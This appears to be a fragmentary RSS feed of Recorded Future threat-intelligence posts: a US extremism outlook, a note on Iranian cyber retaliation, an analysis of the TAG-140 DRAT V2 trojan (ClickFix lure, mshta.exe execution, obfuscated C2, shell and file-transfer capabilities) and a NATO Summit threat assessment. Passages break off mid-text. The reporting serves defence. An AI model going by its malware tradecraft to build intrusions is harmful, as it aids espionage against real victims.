attack plotting, particularly with UAV-borne improvised explosive devices (IEDs) and 3D-printed firearms and weapons components.</p><h3 id="islamic-state">Islamic State</h3><p>The most persistent and lethal violent extremist threat to the US during the next twelve months will very likely come from IS supporters in the US who plan physical threat activities alone or in small groups, rely on minimal external direction from IS, and use less-sophisticated TTPs such as attacks with firearms, bladed weapons, and vehicular assaults. On New Years Day 2025, for example, Shamsud Din Jabbar <a href="https://www.fbi.gov/contact-us/field-offices/neworleans/news/fbi-releases-investigative-update-in-bourbon-street-attack">carried out</a> the first lethal attack in the US connected to IS since 2017, <a href="https://www.ic3.gov/PSA/2025/PSA250113">piloting</a> a pickup truck into a crowd in New Orleans, killing fourteen and wounding over 50. The attack followed a notable uptick in IS activity in the US; according to data from the George Washington University Program on Extremism, the US Department of Justice (DOJ) <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2025-01/Jihadism%20Trends%20in%202024%20%281%29.pdf">arrested</a> nine IS sympathizers on federal charges in 2024, in comparison to six the year prior. These cases allegedly included major efforts by IS sympathizers to conduct mass-casualty attacks in the US, including an Oklahoma resident <a href="https://www.justice.gov/archives/opa/pr/afghan-national-arrested-plotting-election-day-terrorist-attack-name-isis">arrested</a> in October 2024 for planning to attack an election facility on Election Day and a Canada resident <a href="https://www.justice.gov/usao-sdny/pr/pakistani-national-charged-plotting-terrorist-attack-new-york-city-support-isis">arrested</a> in September 2024 for planning to enter the US and carry out a mass shooting at a Jewish community center in New York City.</p><p>Insikt Groups June 2024 <a href="https://go.recordedfuture.com/hubfs/reports/ta-2024-0611.pdf">assessment</a> that the IS Khorasan Province (ISKP) would become ISs global standard-bearer for external operations and media production was largely accurate. ISKP attack planners, functioning alongside IS logistic networks in Central Asia and Trkiye and Russian-, Uzbek-, and Tajik-speaking supporters in Europe, <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-states-external-operations-are-more-just-iskp">carried out</a> several major terrorist attacks in 2024. Notably, these included the January 2024 suicide bombings in Kerman, Iran, that killed over 90, as well as the March 2024 mass shooting at the Crocus City Hall in Moscow, Russia, that resulted in hundreds of casualties, including 145 dead. Attack plots connected to the ISKP were also disrupted by security services in the US, France, Germany, Austria, Belgium, and other countries, including a thwarted effort by ISKP supporters residing in Austria to <a href="https://ctc.westpoint.edu/the-august-2024-taylor-swift-vienna-concert-plot/">attack</a> a Taylor Swift concert in Vienna in August 2024. These efforts followed a lengthy and almost certainly ongoing <a href="https://jamestown.org/program/islamic-state-increasingly-targeted-and-threatened-western-sporting-events-in-advance-of-the-paris-olympics/">campaign</a> spearheaded by the al-Azaim Foundation for Media Production  ISKPs media arm  to <a href="https://gnet-research.org/2024/06/27/iskps-latest-campaign-expanded-propaganda-and-external-operations/">encourage</a> supporters around the world to conduct attacks targeting sports stadiums, large concert halls, and major public events in the US and Europe.</p><p><img src="https://cms.recordedfuture.com/uploads/unnamed_63ac51dabe.png" alt="unnamed.png"></p><p><em><strong>Figure 1:</strong> September 5, 2024, graphic from al-Azaim Foundation for Media Production encouraging attacks in the United States (Source: Recorded Future)</em></p><p>While US-based IS supporters have represented a persistent threat despite ebbs and flows in the organizations health overseas, ongoing geopolitical developments that are very likely <a href="https://foreignpolicy.com/2025/06/05/syrias-islamic-state-is-surging/">favorable</a> to IS will likely enhance its ability to inspire and direct plots in the US. The fall of the Assad regime in Syria, ongoing Turkish military operations in the north of the country, and a decrease in foreign assistance (through funds and military support) to the Kurdish-led Syrian Democratic Forces (SDF) will very likely create <a href="https://www.understandingwar.org/backgrounder/us-withdrawal-syria-will-reinvigorate-isis-terror-threat">opportunities</a> for IS in Iraq and al-Sham (ISIS) to exploit security vacuums and threaten areas in east and northeast Syria. The threat of an ISIS resurgence in 2025 would almost certainly be <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-state-attacks-new-syrian-government">exacerbated</a> by major terrorist attacks against the new Syrian government, or alternatively by a prison break operation to <a href="https://www.politico.com/news/2024/12/17/us-syria-isis-jails-00194955">free</a> captive ISIS fighters and supporters in the SDF-managed al-Hawl and al-Roj prison camps. In the immediate term, an ISIS resurgence would almost certainly provide a propaganda boost for the groups international supporters. In the medium term, it could create opportunities for ISIS to relaunch its external operations capabilities and target the US.</p><h3 id="al-qaeda">Al-Qaeda</h3><p>Al-Qaeda very likely has a limited degree of support among American jihadist Salafi HVEs and is very unlikely to gain much more support due to the ongoing influence of its competitor, IS. In 2024, the US Intelligence Community assessed that al-Qaedas central command had <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2024-Unclassified-Report.pdf">reached</a> its operational nadir. While some of the groups franchises enjoyed substantial success during the past twelve months, the strongest al-Qaeda franchises will likely remain <a href="https://www.csis.org/analysis/jihadist-terrorism-united-states#:~:text=Aside%20from%20the%209%2F11,in%20which%20a%20Royal%20Saudi">focused</a> on their areas of operation and are unlikely to devote significant resources to attacking the West in the short term. Nevertheless, the activities of specific al-Qaeda affiliates in 2024 and early 2025 portend an expanded threat to the US:</p><ul><li>In early 2025, Al-Shabaab <a href="https://www.france24.com/en/live-news/20250327-fears-mount-over-resurgence-of-al-shabaab-jihadists-in-somalia">launched</a> a military operation in the Shabelle and Hiiraan regions of Somalia to recapture areas it held prior to a 2022 counterterrorism operation by the Somali Armed Forces. This ongoing operation will very likely <a href="https://warontherocks.com/2025/06/flailing-state-the-resurgence-of-al-shabaab-in-somalia/">position</a> al-Shabaab to threaten the capital city, Mogadishu, as well as the Somalian governments control over large swaths of the country. A revanchist al-Shabaab with significant territorial control in Somalia would almost certainly <a href="https://www.foreign.senate.gov/imo/media/doc/031418_Bacon_Testimony.pdf">threaten</a> US interests in the Horn of Africa and the Middle East; the group also likely has the means and intent to <a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/the-us-must-sustain-counterterrorism-operations-in-somalia-the-costs-of-retreat-are-too-high/">threaten</a> the US homeland by externally guiding attack plots.</li><li>In late 2023, Al-Qaeda in the Arabian Peninsula (AQAP) <a href="https://www.njohsp.gov/Home/Components/News/News/1388/2">restarted</a> its English-language Inspire series, which provides directions and information for English speakers on conducting terrorist attacks in the West. A February 2024 video specifically <a href="https://monitoring.bbc.co.uk/product/c204zmoi">called</a> for HVEs in the US to conduct local attacks because of the USs support for Israel in its conflict against Hamas. In June 2025, a video message from AQAP leader Saad bin Atef al-Awlaki <a href="https://www.timesofisrael.com/al-qaedas-yemen-chief-threatens-trump-musk-over-gaza-war-there-are-no-red-lines/">encouraged</a> HVEs to assassinate US political leaders, including President Trump and Vice President JD Vance.</li><li>On May 29, 2025, US Africa Command (AFRICOM) Commander General Michael Langley <a href="https://abcnews.go.com/Politics/africa-terror-group-ramping-ability-strike-inside-us/story?id=122316983">warned</a> that Jamaat Nusrat al-Islam wal-Muslimin (JNIM), an al-Qaeda franchise in the Sahel that has gained a substantial territorial footprint in the region, could have the capacity to attack the homeland. However, Insikt Group has not identified intelligence suggesting JNIM has displayed an interest in extraterritorial attack capabilities.</li></ul><p>US-based IS and al-Qaeda supporters will almost certainly continue to use low-budget, low-sophistication, but lethal, <a href="https://www.foreignaffairs.com/articles/united-states/2017-06-13/dont-follow-money">methods</a> of attack such as firearms, bladed weapons, and vehicular assaults, as well as retain their focus on targeting US government and law enforcement agencies, major public events, large commercial facilities, and targets associated with Jewish or Christian communities in the US. However, due to their increasing affordability, commercial availability, and ease of use, jihadist Salafi attack planners are also very likely to experiment with UAV and UAV-borne IEDs as attack TTPs. During 2024, jihadist Salafi propaganda frequently promoted the use of drones in conducting attacks, with some unofficial outlets providing guidance to supporters on how to operate them. A successful UAV-borne IED attack plot, whether in the US or overseas, would almost certainly <a href="https://ctc.westpoint.edu/the-rising-threat-of-non-state-actor-commercial-drone-use-emerging-capabilities-and-threats/">demonstrate</a> a proof of concept and supercharge jihadist Salafi HVEs interest in UAVs.</p><h3 id="hamas">Hamas</h3><p>Mass-casualty terrorist attacks in the US with a nexus to Hamas or other Palestinian Territories-based FTOs (including Palestinian Islamic Jihad [PIJ], the Popular Front for the Liberation of Palestine [PFLP], and others) remain very unlikely in the short term. These organizations have not demonstrated a capability or interest in conducting large-scale attacks in the US, although their ongoing conflict against Israel has almost certainly <a href="https://www.justice.gov/opa/media/1402301/dl">inspired</a> US violent extremists without tangible ties to the organizations to conduct violence. Since Hamass October 7, 2023, al-Aqsa Flood terrorist attack in Israel, the Israel Defense Forces (IDF) have almost certainly <a href="https://www.bbc.com/news/world-middle-east-67103298">decimated</a> Hamass leadership, particularly within the Izz ad-Din al-Qassam Brigades, the organizations military wing. Because of the element of inspiration, large-scale attack plots perpetrated by Hamas supporters in the US cannot be ruled out, although most violence with a direct link to the group is very likely to be small-scale and sporadic, and only occur at protests or demonstrations where Hamas supporters confront counter-demonstrators or law enforcement.</p><p>While post-October 7 developments and Hamass conflict with Israel continue to almost certainly <a href="https://www.dhs.gov/sites/default/files/2024-10/24_0930_ia_24-320-ia-publication-2025-hta-final-30sep24-508.pdf">motivate</a> sympathies for Hamas among American violent extremists, the primary means of interaction between US Hamas supporters and the organizations command and control structure almost certainly continues to be through financing efforts. The group has almost certainly <a href="https://www.congress.gov/crs-product/IF12537">created</a> a complex network of cryptocurrency donation portals, exchanges, and wallets, from which they have <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">generated</a> tens of millions of US dollars from foreign donors, including from the US. These networks have likely replaced the role of brick-and-mortar US-based charitable organizations that, for decades, have allegedly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2023-10/hamas-networks-final.pdf">provided</a> funds from US donors to Hamas, PIJ, PFLP, and other Palestinian FTOs.</p><h3 id="axis-of-resistance">Axis of Resistance</h3><p>The US missile strikes targeting Iranian nuclear facilities on June 21 and 22, 2025, likely increased the risk of HVE and DVE supporters of Iran and its Axis of Resistance groups, such as Hezbollah, the Houthis, Iraqi Shia militias, and others, conducting physical threat activities on US soil, although these groups are still unlikely to carry out a mass-casualty terrorist attack in the US during the next twelve months. While Irans military and intelligence agencies are likely to enhance their efforts to <a href="https://www.washingtoninstitute.org/policy-analysis/contending-irgc-plots">recruit</a> assets in the US to carry out targeted attacks against US political figures and dissidents in the aftermath of the strikes, these efforts will very likely be constrained by US law enforcement investigations, the relative structural weakness of Axis of Resistance groups, and the almost certain disinterest of many US-based HVE and DVE groups in supporting Iran. Several factors during the next twelve months, including public incitement of attacks on US soil by Iranian officials or future US military activity against Iran, could <a href="https://www.dhs.gov/ntas/advisory/national-terrorism-advisory-system-bulletin-june-22-2025">augment</a> these threats, although the most likely scenario is US HVEs and DVEs attempting to provide financial and material support to these groups on their own.</p><p>Irans proxies have not publicly indicated their interest in recruiting or directing Americans to conduct attacks on their behalf in the US since October 7, 2023. However, Irans military and intelligence agencies, particularly the Islamic Revolutionary Guard Corps (IRGC), have almost certainly continued their efforts to <a href="https://www.justice.gov/archives/opa/pr/member-irans-islamic-revolutionary-guard-corps-irgc-charged-plot-murder-former-national">recruit</a> and <a href="https://www.yahoo.com/news/iranian-regime-media-praises-alleged-165750170.html?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAL1ieWEJq2Ibjsklz0LAFd39o3v0kCr5yAvdW5o1TN9OyMaozdUtdoP7A_QUd1o_CXEo6iX1HayOCb12jq0679ZhQzyP-1lpiQ22yWrPl-XB-fdPpkRVks46EIhAfPn9JXp6ya7c4rHr-zW2m9sq_0EgsZXmdxzbN_9i56MAFI-o">incite</a> overseas threat actors to <a href="https://www.justice.gov/usao-sdny/pr/us-attorney-announces-murder-hire-and-related-charges-against-irgc-asset-and-two-local">conduct</a> targeted attacks and assassinations against high-profile US politicians and Iranian dissidents on US soil. Irans motivation to revitalize these efforts, several of which have been <a href="https://edition.cnn.com/2022/08/10/politics/justice-department-charges-iranian-with-trying-to-assassinate-john-bolton">identified</a> and <a href="https://www.pbs.org/newshour/world/pakistani-man-with-ties-to-iran-is-charged-in-u-s-political-assassination-plot">disrupted</a> by US law enforcement, likely increased in the immediate aftermath of US directly attacking Iran, although the subsequent ceasefire and cessation of US military activity in Iran will very likely decrease Irans appetite for remotely guiding terror plots in the medium-to-long term, if the ceasefire holds. There is no evidence to suggest that the IRGC exclusively recruits ideologically motivated violent extremists for these efforts (many of their <a href="https://www.bbc.com/news/articles/c308p0rjq9zo">assets</a> have been <a href="https://www.justice.gov/archives/opa/pr/justice-department-announces-murder-hire-and-related-charges-against-irgc-asset-and-two">participants</a> in criminal organizations who are financially solicited to conduct attacks), and Iran will very likely attempt to <a href="https://www.cbsnews.com/amp/news/trump-administration-monitor-iran-backed-cells-trump-weighs-strikes/">exploit</a> threat actors in the US with common ideological causes to conduct attacks on their behalf.</p><p>Hezbollahs ability to conduct extraterritorial attacks outside of Lebanon was almost certainly diminished by the leadership losses the organization <a href="https://www.washingtoninstitute.org/policy-analysis/after-hezbollahs-miscalculations-it-has-lost-much-its-power">suffered</a> during Israeli strikes in 2024, particularly its secretaries general Hassan Nasrallah and Hashem Safieddine and military leaders Fuad Shukr and Ibrahim Aqil. Notably, Aqil was a senior <a href="https://www.washingtoninstitute.org/policy-analysis/death-another-hezbollah-lifer">member</a> of Hezbollahs Islamic Jihad Organization, which has historically been <a href="https://www.odni.gov/nctc/terrorist_groups/lebanese_hizballah.html">responsible</a> for planning external operations, including in the US. Ongoing Lebanese government efforts to demilitarize Hezbollah will likely further reduce the groups capabilities and interest in attacking the West. In 2024, there were sporadic instances of US HVEs attempting to <a href="https://www.justice.gov/usao-wdpa/pr/upper-st-clair-man-who-traveled-lebanon-and-syria-goal-joining-hizballah-indicted">provide</a> material support for Hezbollah by joining the organization, although in these cases Hezbollah almost certainly indicated they were uninterested in taking on US or Western foreign fighters.</p><p>Likewise, the Houthis have not demonstrated the intent, capability, or interest in conducting terrorist attacks in the US, preferring to <a href="https://www.crisisgroup.org/visual-explainers/red-sea/">target</a> commercial vessels in the Red Sea and, on occasion, Israel. On March 5, 2025, the US Department of State <a href="https://www.state.gov/designation-of-ansarallah-as-a-foreign-terrorist-organization/">redesignated</a> the Houthis as an FTO just before the <a href="https://news.usni.org/2025/04/29/operation-rough-rider">launch</a> of Operation Rough Rider, a US military campaign of airstrikes against the organization in Yemen. During the next twelve months, there are likely to be instances where US HVEs donate or otherwise provide material support to the Houthis. In this case, it would be unclear whether this trend would represent an increase in this activity, as the provision of material support to the Houthis was not illegal (and therefore not subject to prosecutions and investigations) in the US prior to their March 5, 2025, designation.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-2025-0710.pdf" target="_blank">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p><em>ChatGPT: National Cyber Retaliation Possibilities</em></p><p>What happens when a strike silences centrifuges but accelerates keyboards? History tells us this story. When kinetic operations eliminate nuclear capabilities, adversaries pivot to asymmetric digital warfare. US and Israeli companies now sit squarely in the cyber crosshairs.</p><h2 id="escalation-with-code-instead-of-missiles">Escalation with Code Instead of Missiles</h2><p>The US kinetic strike on Iran&#39;s Fordow enrichment plant creates questions about retaliation doctrine. Historical precedent reveals Iran&#39;s preference for <a href="https://ctc.westpoint.edu/cyber-threat-iran-death-soleimani/">cyber responses</a> to physical provocations. 2012s <a href="https://www.ebsco.com/research-starters/political-science/operation-ababil-2012">Operation Ababil</a> and <a href="https://www.controleng.com/throwback-attack-hackers-take-advantage-of-the-holidays-to-hit-oil-giant-saudi-aramco/">Shamoon wiper attack</a>, and 2014s <a href="https://www.bloomberg.com/news/articles/2014-12-11/iranian-hackers-hit-sheldon-adelsons-sands-casino-in-las-vegas?sref=D1QuWRIe">attack on Sands</a>, demonstrated this pattern. Russia&#39;s possible concurrent involvement in such campaigns amplifies both reach and destruction potential.</p><p>Intelligence professionals recognize that adversary keyboards often respond faster than missile batteries.

Iranian threat actors demonstrated a sophisticated understanding of industrial control systems in previous Aramco operations. Expect renewed focus on grid infrastructure and petroleum refinement.</p><p><strong>Defense and Aerospace</strong> contractors face elevated spearphishing and supply chain compromise attempts. Organizations with known DoD contracts should anticipate credential stuffing, social engineering, and APT pivot campaigns targeting intellectual property.</p><p><strong>Financial Services</strong> attract Russian DDoS expertise and payment ecosystem disruption. Major banks, cryptocurrency platforms, and payment processors face coordinated attacks designed to undermine confidence in financial stability.</p><p><strong>Healthcare and Water Infrastructure</strong> provide &quot;soft power&quot; leverage without triggering a full military response. <a href="https://therecord.media/us-offers-reward-for-info-on-iranian-hackers-water-utilities">Recent intrusions into US water treatment facilities</a> illustrate this tactical approach.</p><p>The <a href="https://intelligence2risk.substack.com/p/charting-new-terrain-the-shift-to">proximity-and-resilience graph</a> suggests these sectors will experience accelerated attack velocity as geopolitical tensions escalate.</p><h2 id="strategic-readiness-beyond-soc-operations">Strategic Readiness Beyond SOC Operations</h2><p>Operational controls represent a baseline defense.

Automated purple teaming platforms can simulate Iranian spearphishing or Russian wiper campaigns at scale, identifying control gaps before real attacks exploit them.</li></ul><p>Even with the best of AI, human expertise remains critical for strategic decision-making, false positive management, and complex threat attribution. The optimal approach combines AI speed with human judgment.</p><h2 id="from-crisis-optics-to-resilient-strategy">From Crisis Optics to Resilient Strategy</h2><p>Kinetic escalation has opened pathways for asymmetric digital retribution. However, resilient enterprises leverage threat intelligence for decision-making before breaches occur.

            <description><![CDATA[Analysis of the TAG-140 cyber espionage campaign targeting Indian government organizations, focusing on the development and deployment of the modified DRAT V2 remote access trojan.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>During an investigation into a <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence" target="_blank">recent</a> TAG-140 campaign targeting Indian government organizations, Insikt Group identified a modified variant of the DRAT remote access trojan (RAT), which we designated as DRAT V2. TAG-140 has overlaps with SideCopy, an operational subgroup assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC LEOPARD). TAG-140 has consistently demonstrated iterative advancement and variety in its malware arsenal and delivery techniques. This latest campaign, which spoofed the Indian Ministry of Defence via a cloned press release portal, marks a slight but notable shift in both malware architecture and command-and-control (C2) functionality.</p><p>The deployment of DRAT V2 reflects TAG-140s ongoing refinement of its remote access tooling, transitioning from a .NET-based version of DRAT to a new Delphi-compiled variant. Both versions are among numerous RATs the group has leveraged, such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, and ReverseRAT, indicating a pattern of rotating malware use. DRAT V2 updates its custom TCP-based, server-initiated C2 protocol and expands functional capabilities, including arbitrary shell command execution and enhanced file system interaction.</p><p>Analysis of the infection chain indicates that initial access was achieved through a ClickFix-style social engineering lure. Victims were enticed to execute a malicious script via <span style="font-family:courier;">mshta.exe</span>, which led to the execution of the BroaderAspect .NET loader, which has <a href="https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india" target="_blank">previously</a> been used by TAG-140. BroaderAspect establishes persistence and subsequent DRAT V2 installation and execution.</p><p>Insikt Group attributes this activity to TAG-140 with moderate confidence based on domain overlap, malware lineage, and infrastructure characteristics. DRAT V2s enhancements suggest a likely increase in TAG-140s capacity for tailored post-exploitation and lateral movement across victim networks. As such, its emergence is a relevant indicator of the threat actors maturing tradecraft and strategic targeting of Indias defense and governmental institutions.</p><h2 id="key-findings">Key Findings</h2><ul><li>DRAT V2 adds a new command (<span style="font-family:courier;">exec_this_comm</span>) for arbitrary shell command execution, enhancing post-exploitation flexibility.</li><li>The malware obfuscates its C2 IP addresses using Base64 encoding with prepended strings to hinder straightforward decoding.</li><li>Compared to its predecessor, DRAT V2 reduces string obfuscation by keeping most command headers in plaintext, likely prioritizing parsing reliability over stealth.</li><li>DRAT V2 updates its custom server-initiated TCP protocol to support commands input in both ASCII and Unicode, while responding in ASCII only.</li><li>DRAT V2 lacks advanced anti-analysis techniques and relies on basic infection and persistence methods, making it detectable via static and behavioral analysis.</li></ul><h2 id="background">Background</h2><p>TAG-140 is a threat actor group that overlaps with the publicly reported group Sidecopy, a <a href="https://thehackernews.com/2021/07/sidecopy-hackers-target-indian.html" target="_blank">suspected</a> Pakistani state-aligned advanced persistent threat (APT) group assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC Leopard).

Their infection chains commonly target both Windows and Linux environments.</p><p>Insikt Group analyzed <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence" target="_blank">artifacts</a> from a recent ClickFix campaign spoofing the Indian Ministry, which we have attributed to TAG-140 threat actors. TAG-140 created a counterfeit website mimicking the Indian Ministry of Defence&#39;s official press release portal using the malicious domain <em>email[.]gov[.]in[.]drdosurvey[.]info</em>, which closely resembles the legitimate government website <em>mod[.]gov[.]in</em> (<a href="https://urlscan.io/result/72a275de-19dd-4f96-9594-43a676b86ff5/" target="_blank">urlscan.io</a>). The cloned website replicated the structure and layout of the authentic portal, listing press releases from September 2023 to April 2025. However, only the link for March 2025 was active.</p><p><img src="https://cms.recordedfuture.com/uploads/image1_d279ab1517.png" alt="image1.png"></p><p><em><strong>Figure 1:</strong> Cloned Ministry of Defense portal (Source: Hunt.io)</em></p><p>Clicking the active March 2025 link triggered a ClickFix-style social engineering attack. Insikt Group conducted additional analysis of the TAG-140 Windows infection chain and determined it to be similar to an infection chain <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks/" target="_blank">reported</a> by Seqrite Labs in their research on TAG-140 activity, which was identified in late 2024. Our analysis of the infection chain (<strong>Figure 2</strong>) reveals that the final payload is a new Delphi-based variant of DRAT (referred to as DRAT V2). Previously, DRAT was developed in .NET and was first <a href="https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/" target="_blank">attributed</a> to SideCopy activity in 2023. The updated variant includes new command functionality and a slightly modified C2 protocol.</p><p><img src="https://cms.recordedfuture.com/uploads/image5_2094f095a0.png" alt="image5.png"></p><p><em><strong>Figure 2:</strong> TAG-140 infection chain dropping DRAT V2 (Source: Recorded Future)</em></p><ol type="1">  <li>    The user is directed to the URL below (<a      href="https://urlscan.io/result/01963e28-0733-72c7-9f1f-7582dd251436/"      target="_blank"      >urlscan.io</a    >). While we do not know the delivery mechanism used, based on TAG-140s    tactics, techniques, and procedures (TTPs), this is likely delivered as a    spearphishing email enticing the user to click on the link. The user is then    lured to click on the March 2025 Release link.

Upon establishing communication, the malware passively awaits instructions from the C2 server. Supported operations include system reconnaissance, such as collecting the username, operating system version, system time, and current working directory, as well as connectivity validation and enumeration of local file systems and directories.</p><p>Beyond reconnaissance, DRAT V2 facilitates more active engagement with the target environment. It enables file transfers in both directions between the host and the C2 infrastructure, allowing operators to upload additional payloads or exfiltrate data. Additionally, it supports the execution of local files and arbitrary Windows shell commands, returning the output to the C2. These functions provide TAG-140 with persistent, flexible control over the infected system and allow for both automated and interactive post-exploitation activity without requiring the deployment of auxiliary malware tools. <strong>Figure 4</strong> provides a summary of DRAT V2s capabilities.</p><p><img src="https://cms.recordedfuture.com/uploads/image7_7fa5685589.png" alt="image7.png"></p><p><em><strong>Figure 4:</strong> DRAT V2 capability matrix (Source: Recorded Future)</em></p><h2 id="drat-v2-commands">DRAT V2 Commands</h2><p>DRAT V2 continues its use of a command interface that is a custom TCP, text-based, server-initiated protocol to support remote control capabilities across a compromised host.

The shift in development platforms marks a significant architectural transition that affects how the malware is compiled, executed, and potentially detected. Although both variants maintain similar core functionalities as lightweight RATs, DRAT V2 introduces meaningful enhancements in its command structure, C2 obfuscation techniques, and communication protocol while also minimizing its use of string obfuscation. These adaptations likely reflect TAG-140s continued efforts to evolve their tooling for improved evasion, modularity, and flexibility in post-exploitation operations.</p><h3 id="command-header-variation">Command Header Variation</h3><p>While both DRAT variants implement similar commands for remote administration, each version uses distinct naming conventions for command headers.

Insight from Recorded Futureâs Insikt Group reveals escalating cyber, AI, and hybrid threats from Russia and China amid rising geopolitical tensions.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>On June 24 and 25, 2025, representatives of all 32 members of the North Atlantic Treaty Organization (NATO) will convene in The Hague, the Netherlands, for the 2025 NATO Summit. With each members head of state or government in attendance, the summit represents a high-profile diplomatic event taking place amid heightened geopolitical uncertainty and internal alliance tensions. Key issues, such as the ongoing war in Ukraine, economic volatility, rising Euroscepticism, and concern over the United States (US) commitment to NATO going forward, are all likely to dominate the agenda.</p><p>The complex geopolitical backdrop of the 2025 NATO Summit almost certainly increases its appeal as a target for a wide spectrum of threat actors, including state-sponsored influence operations groups and cyber threat actors, cybercriminals, and hacktivists. Insikt Group assesses that malign influence operations, cyber-espionage activity, and a measurable uptick in cybercriminal and hacktivist activity likely represent the three primary threat vectors to the 2025 NATO Summit. Russian and Chinese influence networks will almost certainly seek to exploit the summit to amplify perceptions of NATO disunity and undermine its credibility as a reliable security partner. In parallel, Russian state-sponsored cyber actors are highly likely to conduct targeted espionage against NATO-affiliated entities and personnel, while Chinese cyber threat actors are more likely to pursue opportunistic intrusions to glean insight into alliance policies and future planning. Hacktivist and cybercriminal actors are already attempting to capitalize on the summits geopolitical visibility for financial gain and political messaging, based on closed forum references to NATO and ongoing targeting of NATO member states.</p><p>Security officials are simultaneously preparing extensive physical security measures to safeguard the event. While direct attacks on the summit by Russian hybrid actors  encompassing conventional and irregular military forces  are unlikely, tactics such as sabotage, vandalism, weaponized migration, and provocative military signaling will very likely continue to pressure NATO member states around the time of the event, particularly allies in Eastern Europe. At the time of publication, Insikt Group assesses that protests during the summit are very likely, but risks associated with protest activities are largely mitigated through proactive security measures. Additionally, we have not observed any credible evidence suggesting that violent non-state actors are planning or expressing intent to target the summit.</p><h2 id="key-findings">Key Findings</h2><ul><li>We assess NATOs ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliances utility, rising political influence of Eurosceptic far right parties in several NATO member states, and Russias continued efforts to undermine NATO unity via its military campaign in Ukraine and hybrid sabotage and influence operations in Europe. </li><li>Russian hybrid threats, including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posturing, will very likely continue to target European countries ahead of and following the 2025 NATO Summit, particularly if the summit results in significant action regarding Ukraine  with the Baltic states, Poland, and Germany likely at highest risk. </li><li>Both Russia and Chinas own influence ecosystems will almost certainly attempt to shape public opinion around the 2025 NATO Summit by portraying the alliance as aggressive, divisive, and divided.</li><li>Malign influence actors, particularly from Russia, are likely to use artificial intelligence (AI)-generated media in an effort to discredit NATO leadership, delegitimize summit outcomes, and further inflame tensions among member states.</li><li>Cybercriminal and hacktivist activity referencing NATO has surged across dark web and special-access forums in the months leading up to the 2025 NATO Summit, very likely signaling a heightened risk of ideologically driven and financially motivated multi-vector campaigns targeting NATO member states and defense-affiliated entities.</li><li>Russian state-aligned threat groups, particularly those linked to the SVR, FSB, and GRU, are highly likely to conduct targeted operations against entities and personnel associated with the 2025 NATO Summit.</li><li>Chinese state-sponsored groups tasked with the collection of foreign intelligence, particularly those under the Ministry of State Security, are likely to engage in some level of opportunistic cyber-espionage operations against select attendees with the goal of understanding summit-related policy discussions and outcomes. </li><li>The Netherlands extensive security posture around the 2025 NATO Summit will very likely mitigate the scope, sophistication, and impact of physical security threats to the event from violent non-state actors, including terrorists, violent extremists, criminal organizations, and disruptive protest movements.</li></ul><h2 id="strategic-threat-environment">Strategic Threat Environment</h2><p>2025 NATO Summit Likely Pivotal for Alliances Future Unity</p><p>The 2025 NATO Summit comes at a time when the alliances ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliances utility; rising political influence of Euroskeptic far right parties in several NATO member states; and Russias continued efforts to undermine NATO unity via its military campaign in Ukraine, and hybrid sabotage and influence operations in Europe. </p><p>The US governments public messaging concerning its commitment to NATO has been inconsistent throughout President Donald Trumps first and second terms. In 2025, President Trump suggested that the USs commitment to Article 5 of NATOs founding treaty would depend on a given NATO states defense spending, <a href="https://www.theguardian.com/us-news/2025/mar/07/donald-trump-nato-alliance-us-security-support" target="_blank">stating</a>, If they dont pay, Im not going to defend them. In contrast, in 2017, President Trump <a href="https://www.atlanticcouncil.org/blogs/natosource/exclusive-trump-discovers-article-5-after-disastrous-nato-visit/?utm_source=chatgpt.com" target="_blank">stated</a>, Absolutely, Id be committed to Article 5. </p><p>Secretary of State Marco Rubio <a href="https://kyivindependent.com/nato-funding-explained-as-trump-mulls-cuts/" target="_blank">announced</a> that all NATO members will be expected to spend 5% of their GDP on defense over the next decade, an increase from the previous benchmark of 2%. Although Rubio emphasized that the US remains committed to supporting NATO, notes from an internal Trump Administration proposal <a href="https://apnews.com/article/state-department-funding-cuts-trump-diplomacy-8305713dc6da1b95811486b62bf46582" target="_blank">revealed</a> plans to reduce the amount of money the US would contribute to NATOs budget. The US currently <a href="https://www.nato.int/cps/uk/natohq/topics_67655.htm?selectedLocale=en" target="_blank">provides</a> roughly 16% of the alliances funding. </p><p>In some key NATO states, the rising political <a href="https://carnegieendowment.org/research/2024/04/charting-the-radical-rights-influence-on-eu-foreign-policy?center=russia-eurasia&lang=en" target="_blank">influence</a> of far-right parties that are skeptical of NATO and sympathetic to Russia likely complicates their ability to reinforce NATO commitments. For example, Frances Rassemblement National (RN) has historically advocated for Frances withdrawal from NATO. Though the RN has recently moderated its position, its historically anti-NATO position risks complicating French President Emmanuel Macrons ability to achieve consensus on increased French defense spending for NATO. Germanys Alternative 